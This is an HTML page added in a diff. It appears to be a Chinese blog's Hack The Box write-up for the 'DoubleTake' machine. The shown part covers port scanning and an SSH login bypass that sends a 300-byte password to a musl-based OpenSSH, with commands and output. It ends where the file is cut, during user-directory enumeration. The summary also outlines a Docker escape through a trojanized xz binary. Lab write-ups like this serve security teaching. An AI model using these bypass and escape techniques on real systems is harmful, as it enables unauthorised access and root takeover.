@@ -1,0 +1,1347 @@
+<!DOCTYPE html>
+<html lang="zh-cn" dir="ltr">
+    <head><meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content="DoubleTake About：DoubleTake is an easy-difficulty Linux machine running an AI agent platform behind a Docker container. Port 22 serves SSH from an Alpine container with OpenSSH 10.6p1 compiled against musl. CVE-2026-123158 bypasses password authentication for the alpine user by sending a 300-byte password that causes musl&rsquo;s crypt() to return &quot;*&quot;, matching the locked account&rsquo;s shadow">
+<title>19. DoubleTake</title>
+
+<link rel='canonical' href='https://Sp1ke-sec.github.io/p/19.-doubletake/'>
+
+<link rel="stylesheet" href="/scss/style.min.3dc2b87862416cdfa498393fe10f71a7856c63450472efbab1e94150643be501.css"><meta property='og:title' content="19. DoubleTake">
+<meta property='og:description' content="DoubleTake About：DoubleTake is an easy-difficulty Linux machine running an AI agent platform behind a Docker container. Port 22 serves SSH from an Alpine container with OpenSSH 10.6p1 compiled against musl. CVE-2026-123158 bypasses password authentication for the alpine user by sending a 300-byte password that causes musl&rsquo;s crypt() to return &quot;*&quot;, matching the locked account&rsquo;s shadow">
+<meta property='og:url' content='https://Sp1ke-sec.github.io/p/19.-doubletake/'>
+<meta property='og:site_name' content='Sp1ke-sec 安全博客'>
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:published_time' content='2026-11-14T21:39:22&#43;08:00'/><meta property='article:modified_time' content='2026-11-14T21:39:22&#43;08:00'/><meta property='og:image' content='https://Sp1ke-sec.github.io/p/19.-doubletake/assets/image-20261113211115576.png' />
+<meta name="twitter:title" content="19. DoubleTake">
+<meta name="twitter:description" content="DoubleTake About：DoubleTake is an easy-difficulty Linux machine running an AI agent platform behind a Docker container. Port 22 serves SSH from an Alpine container with OpenSSH 10.6p1 compiled against musl. CVE-2026-123158 bypasses password authentication for the alpine user by sending a 300-byte password that causes musl&rsquo;s crypt() to return &quot;*&quot;, matching the locked account&rsquo;s shadow"><meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:image" content='https://Sp1ke-sec.github.io/p/19.-doubletake/assets/image-20261113211115576.png' />
+    <link rel="shortcut icon" href="/favicon.ico" />
+
+  
+
+
+    </head>
+    <body class="
+    article-page
+    ">
+    <script>
+        (function() {
+            const colorSchemeKey = 'StackColorScheme';
+            if(!localStorage.getItem(colorSchemeKey)){
+                localStorage.setItem(colorSchemeKey, "auto");
+            }
+        })();
+    </script><script>
+    (function() {
+        const colorSchemeKey = 'StackColorScheme';
+        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
+        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;
+
+        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
+            
+
+            document.documentElement.dataset.scheme = 'dark';
+        } else {
+            document.documentElement.dataset.scheme = 'light';
+        }
+    })();
+</script>
+<div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky ">
+    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="切换菜单">
+        <span class="hamburger-box">
+            <span class="hamburger-inner"></span>
+        </span>
+    </button>
+
+    <header>
+        
+            
+            <figure class="site-avatar">
+                <a href="/">
+                
+                    
+                    
+                    
+                        
+                        <img src="/img/avatar_hu1489495842607495246.jpg" width="300"
+                            height="300" class="site-logo" loading="lazy" alt="Avatar">
+                    
+                
+                </a>
+                
+                    <span class="emoji">🚭</span>
+                
+            </figure>
+            
+        
+        
+        <div class="site-meta">
+            <h1 class="site-name"><a href="/">Sp1ke-sec 安全博客</a></h1>
+            <h2 class="site-description">这里是 Sp1ke-sec</h2>
+        </div>
+    </header><ol class="menu-social">
+            
+                <li>
+                    <a 
+                        href='https://github.com/Sp1ke-sec'
+                        target="_blank"
+                        title="GitHub"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M9 19c-4.3 1.4 -4.3 -2.5 -6 -3m12 5v-3.5c0 -1 .1 -1.4 -.5 -2c2.8 -.3 5.5 -1.4 5.5 -6a4.6 4.6 0 0 0 -1.3 -3.2a4.2 4.2 0 0 0 -.1 -3.2s-1.1 -.3 -3.5 1.3a12.3 12.3 0 0 0 -6.2 0c-2.4 -1.6 -3.5 -1.3 -3.5 -1.3a4.2 4.2 0 0 0 -.1 3.2a4.6 4.6 0 0 0 -1.3 3.2c0 4.6 2.7 5.7 5.5 6c-.6 .6 -.6 1.2 -.5 2v3.5" />
+</svg>
+
+
+
+                        
+                    </a>
+                </li>
+            
+        </ol><ol class="menu" id="main-menu">
+        
+        
+        
+        <li >
+            <a href='/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <polyline points="5 12 3 12 12 3 21 12 19 12" />
+  <path d="M5 12v7a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-7" />
+  <path d="M9 21v-6a2 2 0 0 1 2 -2h2a2 2 0 0 1 2 2v6" />
+</svg>
+
+
+
+                
+                <span>主页</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/%E5%85%B3%E4%BA%8E/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="7" r="4" />
+  <path d="M6 21v-2a4 4 0 0 1 4 -4h4a4 4 0 0 1 4 4v2" />
+</svg>
+
+
+
+                
+                <span>关于</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/archives/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <rect x="3" y="4" width="18" height="4" rx="2" />
+  <path d="M5 8v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-10" />
+  <line x1="10" y1="12" x2="14" y2="12" />
+</svg>
+
+
+
+                
+                <span>归档</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/search/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="10" cy="10" r="7" />
+  <line x1="21" y1="21" x2="15" y2="15" />
+</svg>
+
+
+
+                
+                <span>搜索</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/%E5%8F%8B%E6%83%85%E9%93%BE%E6%8E%A5/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M10 14a3.5 3.5 0 0 0 5 0l4 -4a3.5 3.5 0 0 0 -5 -5l-.5 .5" />
+  <path d="M14 10a3.5 3.5 0 0 0 -5 0l-4 4a3.5 3.5 0 0 0 5 5l.5 -.5" />
+</svg>
+
+
+
+                
+                <span>友情链接</span>
+            </a>
+        </li>
+        
+        <li class="menu-bottom-section">
+            <ol class="menu">
+
+                
+                    <li id="dark-mode-toggle">
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="8" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="16" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <span>暗色模式</span>
+                    </li>
+                
+            </ol>
+        </li>
+    </ol>
+</aside>
+
+    <aside class="sidebar right-sidebar sticky">
+        
+            
+                
+    <section class="widget archives">
+        <div class="widget-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <line x1="5" y1="9" x2="19" y2="9" />
+  <line x1="5" y1="15" x2="19" y2="15" />
+  <line x1="11" y1="4" x2="7" y2="20" />
+  <line x1="17" y1="4" x2="13" y2="20" />
+</svg>
+
+
+
+        </div>
+        <h2 class="widget-title section-title">目录</h2>
+        
+        <div class="widget--toc">
+            <nav id="TableOfContents">
+  <ol>
+    <li><a href="#信息收集">信息收集</a>
+      <ol>
+        <li><a href="#端口扫描">端口扫描</a></li>
+      </ol>
+    </li>
+    <li><a href="#立足点">立足点</a>
+      <ol>
+        <li><a href="#cve-2026-123158-sshole">CVE-2026-123158 (sshole)</a></li>
+      </ol>
+    </li>
+    <li><a href="#横向移动">横向移动</a>
+      <ol>
+        <li><a href="#枚举用户目录">枚举用户目录</a></li>
+      </ol>
+    </li>
+    <li><a href="#提权">提权</a>
+      <ol>
+        <li><a href="#web-侦察">Web 侦察</a></li>
+        <li><a href="#cve-2026-41567">CVE-2026-41567</a></li>
+      </ol>
+    </li>
+  </ol>
+</nav>
+        </div>
+    </section>
+
+            
+        
+    </aside>
+
+
+            <main class="main full-width">
+    <article class="has-image main-article">
+    <header class="article-header">
+        <div class="article-image">
+            <a href="/p/19.-doubletake/">
+                <img src="/p/19.-doubletake/assets/image-20261113211115576_hu15602859076181887186.png"
+                        srcset="/p/19.-doubletake/assets/image-20261113211115576_hu15602859076181887186.png 800w, /p/19.-doubletake/assets/image-20261113211115576_hu15227180007424027577.png 1600w"
+                        width="800" 
+                        height="332" 
+                        loading="lazy"
+                        alt="Featured image of post 19. DoubleTake" />
+                
+            </a>
+        </div>
+    
+
+    <div class="article-details">
+    
+    <header class="article-category">
+        
+            <a href="/categories/htb/" style="background-color: #2a9d8f; color: #fff;">
+                HTB
+            </a>
+        
+            <a href="/categories/easy/" >
+                Easy
+            </a>
+        
+    </header>
+    
+
+    <div class="article-title-wrapper">
+        <h2 class="article-title">
+            <a href="/p/19.-doubletake/">19. DoubleTake</a>
+        </h2>
+    
+        
+    </div>
+
+    
+    
+    
+    
+    <footer class="article-time">
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
+  <circle cx="18" cy="18" r="4" />
+  <path d="M15 3v4" />
+  <path d="M7 3v4" />
+  <path d="M3 11h16" />
+  <path d="M18 16.496v1.504l1 1" />
+</svg>
+                <time class="article-time--published">2026-11-14</time>
+            </div>
+        
+
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <polyline points="12 7 12 12 15 15" />
+</svg>
+
+
+
+                <time class="article-time--reading">
+                    阅读时长: 8 分钟
+                </time>
+            </div>
+        
+    </footer>
+    
+
+    
+</div>
+
+</header>
+
+    <section class="article-content">
+    
+    
+    <h1 id="doubletake">DoubleTake
+</h1><p><img src="/p/19.-doubletake/assets/image-20261113211115576.png"
+	width="441"
+	height="183"
+	srcset="/p/19.-doubletake/assets/image-20261113211115576_hu16403564836090101844.png 480w, /p/19.-doubletake/assets/image-20261113211115576_hu18102120477593059405.png 1024w"
+	loading="lazy"
+	
+		alt="image-20261113211115576"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="240"
+		data-flex-basis="578px"
+	
+></p>
+<p>About：<code>DoubleTake</code> is an easy-difficulty Linux machine running an AI agent platform behind a Docker container. Port 22 serves SSH from an Alpine container with OpenSSH 10.6p1 compiled against musl. CVE-2026-123158 bypasses password authentication for the <code>alpine</code> user by sending a 300-byte password that causes musl&rsquo;s <code>crypt()</code> to return <code>&quot;*&quot;</code>, matching the locked account&rsquo;s shadow entry. Inside the container, a saved <code>Firefox</code> login reveals credentials for the web application on port 80. The platform exposes a deploy endpoint that forwards archives to the Docker API&rsquo;s <code>PUT /containers/{id}/archive</code>. Docker 29.5.0 is vulnerable to CVE-2026-41567, which resolves decompression binaries from the container&rsquo;s overlay filesystem instead of the host&rsquo;s. Replacing <code>/usr/bin/xz</code> in the container and uploading a compressed archive through the deploy page causes the Docker daemon to execute the trojanized binary as host root.</p>
+<p>介绍：DoubleTake 是一台难度较低的 Linux 机器，运行在 Docker 容器后方的 AI 代理平台。22 端口通过 Alpine 容器提供 SSH 服务，该容器使用基于 musl 编译的 OpenSSH 10.6p1 版本。CVE-2026-123158 通过发送 300 字节的密码绕过 alpine 用户的密码验证，导致 musl 的 crypt() 返回“*”，与锁定帐户的影子条目匹配。在容器内部，保存的 Firefox 登录信息会显示端口 80 上 Web 应用程序的凭据。该平台公开了一个部署端点，该端点会将归档文件转发到 Docker API 的 PUT /containers/{id}/archive。Docker 29.5.0 存在 CVE-2026-41567 漏洞，该漏洞会从容器的 overlay 文件系统而不是主机的文件系统中解析解压缩二进制文件。在容器中替换 /usr/bin/xz 并通过部署页面上传压缩归档文件会导致 Docker 守护程序以主机 root 用户身份执行木马化的二进制文件。</p>
+<p>靶机 IP：10.129.76.130</p>
+<p>连通性测试：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">┌──<span class="o">(</span>root㉿kali<span class="o">)</span>-<span class="o">[</span>~/HTB/DoubleTake<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─# ping -c <span class="m">4</span> 10.129.76.130           
+</span></span><span class="line"><span class="cl">PING 10.129.76.130 <span class="o">(</span>10.129.76.130<span class="o">)</span> 56<span class="o">(</span>84<span class="o">)</span> bytes of data.
+</span></span><span class="line"><span class="cl"><span class="m">64</span> bytes from 10.129.76.130: <span class="nv">icmp_seq</span><span class="o">=</span><span class="m">1</span> <span class="nv">ttl</span><span class="o">=</span><span class="m">63</span> <span class="nv">time</span><span class="o">=</span><span class="m">132</span> ms
+</span></span><span class="line"><span class="cl"><span class="m">64</span> bytes from 10.129.76.130: <span class="nv">icmp_seq</span><span class="o">=</span><span class="m">2</span> <span class="nv">ttl</span><span class="o">=</span><span class="m">63</span> <span class="nv">time</span><span class="o">=</span><span class="m">130</span> ms
+</span></span><span class="line"><span class="cl"><span class="m">64</span> bytes from 10.129.76.130: <span class="nv">icmp_seq</span><span class="o">=</span><span class="m">3</span> <span class="nv">ttl</span><span class="o">=</span><span class="m">63</span> <span class="nv">time</span><span class="o">=</span><span class="m">129</span> ms
+</span></span><span class="line"><span class="cl"><span class="m">64</span> bytes from 10.129.76.130: <span class="nv">icmp_seq</span><span class="o">=</span><span class="m">4</span> <span class="nv">ttl</span><span class="o">=</span><span class="m">63</span> <span class="nv">time</span><span class="o">=</span><span class="m">131</span> ms
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">--- 10.129.76.130 ping statistics ---
+</span></span><span class="line"><span class="cl"><span class="m">4</span> packets transmitted, <span class="m">4</span> received, 0% packet loss, <span class="nb">time</span> 3025ms
+</span></span><span class="line"><span class="cl">rtt min/avg/max/mdev <span class="o">=</span> 129.437/130.784/132.416/1.112 ms
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="信息收集">信息收集
+</h2><h3 id="端口扫描">端口扫描
+</h3><p>使用 Nmap 做端口扫描。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">┌──<span class="o">(</span>root㉿kali<span class="o">)</span>-<span class="o">[</span>~/HTB/DoubleTake<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─# nmap -Pn 10.129.76.130                 
+</span></span><span class="line"><span class="cl">Starting Nmap 7.99 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2026-11-14 12:20 +0000
+</span></span><span class="line"><span class="cl">Nmap scan report <span class="k">for</span> 10.129.76.130 <span class="o">(</span>10.129.76.130<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Host is up <span class="o">(</span>0.15s latency<span class="o">)</span>.
+</span></span><span class="line"><span class="cl">Not shown: <span class="m">998</span> closed tcp ports <span class="o">(</span>reset<span class="o">)</span>
+</span></span><span class="line"><span class="cl">PORT   STATE SERVICE
+</span></span><span class="line"><span class="cl">22/tcp open  ssh
+</span></span><span class="line"><span class="cl">80/tcp open  http
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 2.04 seconds
+</span></span><span class="line"><span class="cl">                                                                                        
+</span></span><span class="line"><span class="cl">┌──<span class="o">(</span>root㉿kali<span class="o">)</span>-<span class="o">[</span>~/HTB/DoubleTake<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─# nmap -Pn -sV -sC -p 22,80 10.129.76.130
+</span></span><span class="line"><span class="cl">Starting Nmap 7.99 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2026-11-14 12:20 +0000
+</span></span><span class="line"><span class="cl">Nmap scan report <span class="k">for</span> 10.129.76.130 <span class="o">(</span>10.129.76.130<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Host is up <span class="o">(</span>0.14s latency<span class="o">)</span>.
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">PORT   STATE SERVICE VERSION
+</span></span><span class="line"><span class="cl">22/tcp open  ssh     OpenSSH 10.6 <span class="o">(</span>protocol 2.0<span class="o">)</span>
+</span></span><span class="line"><span class="cl">80/tcp open  http    nginx 1.24.0 <span class="o">(</span>Ubuntu<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> http-auth: 
+</span></span><span class="line"><span class="cl"><span class="p">|</span> HTTP/1.1 <span class="m">401</span> UNAUTHORIZED<span class="se">\x</span>0D
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_  Basic <span class="nv">realm</span><span class="o">=</span>Zentara
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: Site doesn<span class="err">&#39;</span>t have a title <span class="o">(</span>text/html<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>utf-8<span class="o">)</span>.
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-server-header: nginx/1.24.0 <span class="o">(</span>Ubuntu<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span class="line"><span class="cl">Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 12.14 seconds
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>开放了 22 和 80 端口。</p>
+<h2 id="立足点">立足点
+</h2><h3 id="cve-2026-123158-sshole">CVE-2026-123158 (sshole)
+</h3><p>四个独立的设计，结合起来导致了这个绕过：</p>
+<ol>
+<li>BSD 约定，不能使用密码认证的账户在 <code>/etc/shadow</code> 文件中的密码字段为 <code>*</code>。</li>
+<li>musl 的 <code>crypt()</code> 函数在失败后返回字符 <code>*</code>。</li>
+<li>musl 的 <code>SHA-256/512</code> 限制密钥在 256 字节以内。所以一个长度超过 256 字节的密码将触发 <code>crypt()</code> 的失败，从而返回字符 <code>&quot;*&quot;</code> 。</li>
+<li>OpenSSH 为修复 <code>CVE-2016-6210</code>，添加了一条规则：如果 shadow 文件中的密码字段过短，没有合法盐值，会从别的用户那里借 <code>$6$</code> 盐值。从而导致这个登录请求走到 musl 的 <code>crypt()</code> 分支，触发长度限制的 bug，返回 <code>&quot;*&quot;</code>，最终绕过登录。</li>
+</ol>
+<p>这就导致所有 shadow 文件中密码字段为 <code>*</code> 的账户都成为可以 bypass 的目标，但前提是 <code>sshd</code> 允许账户尝试密码登录。</p>
+<p>所以，虽然 <code>root</code> 用户的密码字段也是 <code>*</code>，但是由于 <code>PermitRootLogin</code> 为 no，所以系统会禁止 root 密码登录。</p>
+<p>但是在 Alpine Linux 机器上，系统用户 <code>alpine</code> 的密码字段也是 <code>*</code>，并且没有被 <code>PermitRootLogin</code> 限制，所以我们可以 bypass 登录 <code>alpine</code>。</p>
+<br/>
+<p>具体的执行过程是，我们生成一个长度 &gt; 256 字节的字符串，作为 <code>alpine</code> 的密码传入。<code>sshd</code> 会借用其它用户的盐值 <code>$6$</code> ，与我们传入的字符串一同输入给 <code>crypt()</code>，由于长度过长，函数返回一个 <code>*</code>。然后 <code>sshd</code> 再用这个 <code>*</code> 与 shadow 文件中的密码字段比较，由于 <code>*==*</code>，所以比较成功，顺利登录。</p>
+<p>注意，这里需要尝试两次密码，因为第一次会调用<code>getspnam()</code> 查找盐 donor，该 salt donor 覆盖了 <code>shadow_pw()</code> 返回的静态缓冲区。存储字段第一次尝试时不再读出<code>*</code>，因此失败。但<code>pick_salt()</code>会将借来的盐缓存在静态变量中。第二次尝试时，<code>shadow_pw()</code>从新的<code>getspnam()</code>调用中重新加载<code>*</code>，<code>pick_salt()</code>返回缓存，且不再次触及缓冲区。这个比较成立。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">┌──<span class="o">(</span>root㉿kali<span class="o">)</span>-<span class="o">[</span>~/HTB/DoubleTake<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─# <span class="nb">printf</span> <span class="s1">&#39;A%.0s&#39;</span> <span class="o">{</span>1..300<span class="o">}</span>   
+</span></span><span class="line"><span class="cl">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA                                                                                             
+</span></span><span class="line"><span class="cl">┌──<span class="o">(</span>root㉿kali<span class="o">)</span>-<span class="o">[</span>~/HTB/DoubleTake<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─# ssh alpine@10.129.75.232 
+</span></span><span class="line"><span class="cl">alpine@10.129.75.232<span class="s1">&#39;s password: 
+</span></span></span><span class="line"><span class="cl"><span class="s1">Permission denied, please try again.
+</span></span></span><span class="line"><span class="cl"><span class="s1">alpine@10.129.75.232&#39;</span>s password: 
+</span></span><span class="line"><span class="cl">Welcome to Alpine!
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">The Alpine Wiki contains a large amount of how-to guides and general
+</span></span><span class="line"><span class="cl">information about administrating Alpine systems.
+</span></span><span class="line"><span class="cl">See &lt;https://wiki.alpinelinux.org/&gt;.
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">You can setup the system with the command: setup-alpine
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">You may change this message by editing /etc/motd.
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">7f906e0ee8ec:~$ id
+</span></span><span class="line"><span class="cl"><span class="nv">uid</span><span class="o">=</span>1000<span class="o">(</span>alpine<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1000<span class="o">(</span>alpine<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1000<span class="o">(</span>alpine<span class="o">)</span>
+</span></span><span class="line"><span class="cl">7f906e0ee8ec:~$ 
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>因为这里的主机名是一串哈希 <code>7f906e0ee8ec</code>，而 docker 默认容器 ID 作为主机名，所以可以推测这是 Docker 容器。</p>
+<p>Docker 容器的另一个特征是根目录有 <code>/.dockerenv</code>。</p>
+<h2 id="横向移动">横向移动
+</h2><h3 id="枚举用户目录">枚举用户目录
+</h3><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">7f906e0ee8ec:~$ <span class="nb">pwd</span>
+</span></span><span class="line"><span class="cl">/home/alpine
+</span></span><span class="line"><span class="cl">7f906e0ee8ec:~$ ls -la
+</span></span><span class="line"><span class="cl">total <span class="m">20</span>
+</span></span><span class="line"><span class="cl">drwxr-sr-x    <span class="m">1</span> alpine   alpine        <span class="m">4096</span> Nov <span class="m">14</span> 12:20 .
+</span></span><span class="line"><span class="cl">drwxr-xr-x    <span class="m">1</span> root     root          <span class="m">4096</span> Nov <span class="m">10</span> 20:15 ..
+</span></span><span class="line"><span class="cl">-rw-------    <span class="m">1</span> alpine   alpine          <span class="m">85</span> Nov <span class="m">14</span> 12:24 .ash_history
+</span></span><span class="line"><span class="cl">drwxr-sr-x    <span class="m">3</span> alpine   alpine        <span class="m">4096</span> Nov <span class="m">10</span> 20:15 .mozilla
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><code>.mozilla</code> 是火狐 Firefox 浏览器的默认用户数据目录，当 Alpine 里自带 Firefox 时就会生成这个文件夹。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
